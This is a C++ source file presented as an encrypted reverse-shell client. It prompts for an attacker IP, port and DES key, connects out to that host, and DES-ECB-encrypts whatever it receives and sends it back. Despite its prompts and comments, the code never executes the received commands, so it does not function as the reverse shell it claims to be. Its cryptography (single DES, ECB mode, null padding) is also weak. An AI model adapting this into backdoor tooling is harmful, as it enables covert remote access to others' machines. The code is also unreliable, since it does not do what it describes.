// g++ -o DES.o DES.cpp -lssl -lcrypto

#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/des.h>
#include <cstdlib>
#include <ctime>

// Base64 encoding function
std::string base64_encode(const std::string &in) {
    static const char *table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;

    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(table[((val << 8) >> valb) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

void print_banner() {
    std::cout << "\033[97m"
        << R"(
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⣀⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠉⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠔⡲⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠁⠀⣠⢊⣀⡀⠀⠀⠀⢀⣀⠤⠤⠤⠤⣀⠤⠚⠉⠉⠉⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⡟⠉⠀⠉⠙⠒⠲⠁⠀⠀⠀⠀⠀⠀⡴⠚⠉⠉⠂⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⡜⠀⡇⢏⠓⠦⠤⡴⠃⠀⠀⠀⡆⠀⠀⠀⠙⠲⠤⣀⠀⠘⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⡴⠀⠀⡸⠁⠀⠸⡌⠁⣠⠞⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⢻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⢰⠁⠀⠠⠇⠀⠀⠀⣧⠈⠁⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠱⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠹⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡿⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠘⠤⡀⠀⠀⠀⣠⣀⠀⠀⠀⢀⣤⣤⠀⠀⠀⠀⠘⠀⡜⠁⠀⠀⢳⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⠇⠀⠀⠘⣇⠀⠀⢀⠀⠀⠀⠀⠀⠀⠱⡄⠀⠀⠙⠛⠁⠀⠀⠀⢩⠁⠀⠀⠀⢠⣮⠎⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⢻⡄⠀⠸⡇⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⢿⠀⠀⠀⠀⠘⡄⠀⠀⡰⠋⠁⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⢳⡀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠈⠑⢾⡞⠀⣀⣄⣀⡀⢹⢃⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠳⡄⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣯⣠⣤⣤⢃⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⠀⠀
⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢌⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠷⠶⠟⠋⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⠀⠀
⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠤⠐⠁⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀
⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⢠⠛⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀
⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⡎⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀
⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢳⠀⠀⠈⠳⣄⡰⠀⠀⠀⠀⠀⠀⠀⢀⠇⠀
⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠈⡆⠀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀
⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⢰⠃⠀⣤⣏⠀⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀
⠀⠀⡿⠀⠀⠀⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⡇⠀⠀⢻⡿⣦⡀⠀⠀⠀⣠⠾⠋⠀⠀⠀⠀
⠀⢰⡇⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⢸⠁⠀⠀⠀⠉⠉⠙⠓⠚⠋⠁⠀⠀⠀⠀⠀⠀
⠠⠼⠥⠤⠤⠤⠤⠤⠤⠧⠤⠤⠤⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⣇⣸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠒⠒⠒⠒⠛⠛⠃⠀
)"
        << "\033[0m";
}

std::string get_attacker_info() {
    std::string attacker_ip;
    std::cout << "Enter the IP address for the reverse shell: ";
    std::cin >> attacker_ip;
    return attacker_ip;
}

int get_port() {
    int port;
    std::cout << "Enter the port number for the reverse shell: ";
    std::cin >> port;
    return port;
}

std::string get_des_key() {
    std::string key;
    std::cout << "Enter your DES key (must be 8 bytes long): ";
    std::cin >> key;
    while (key.length() != 8) {
        std::cout << "Invalid key length. DES key must be 8 bytes long.\n";
        std::cout << "Enter your DES key (must be 8 bytes long): ";
        std::cin >> key;
    }
    return key;
}

std::string encrypt_data(const std::string &data, const std::string &key) {
    DES_cblock key_block;
    DES_key_schedule schedule;

    // Convert key to DES_cblock
    memcpy(key_block, key.c_str(), 8);
    DES_set_key(&key_block, &schedule);

    std::string padded_data = data;
    while (padded_data.size() % 8 != 0) {
        padded_data += '\0'; // Pad with null bytes
    }

    std::string encrypted_data(padded_data.size(), '\0');
    for (size_t i = 0; i < padded_data.size(); i += 8) {
        DES_ecb_encrypt((DES_cblock*)(padded_data.data() + i), (DES_cblock*)(encrypted_data.data() + i), &schedule, DES_ENCRYPT);
    }
    return base64_encode(encrypted_data);
}

int main() {
    print_banner();
    std::string ip = get_attacker_info();
    int port = get_port();
    std::string key = get_des_key();

    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Socket creation failed: " << strerror(errno) << "\n";
        return 1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr);

    // Connect to the attacker
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "Connection failed: " << strerror(errno) << "\n";
        close(sockfd);
        return 1;
    }

    std::cout << "Connected to the attacker.\n";

    // Listen for commands
    while (true) {
        char buffer[1024];
        ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            std::cerr << "Connection closed or error: " << strerror(errno) << "\n";
            break;
        }
        std::string command(buffer, bytes_received);
        std::string encrypted_command = encrypt_data(command, key);
        send(sockfd, encrypted_command.c_str(), encrypted_command.size(), 0);
    }

    close(sockfd);
    return 0;
}

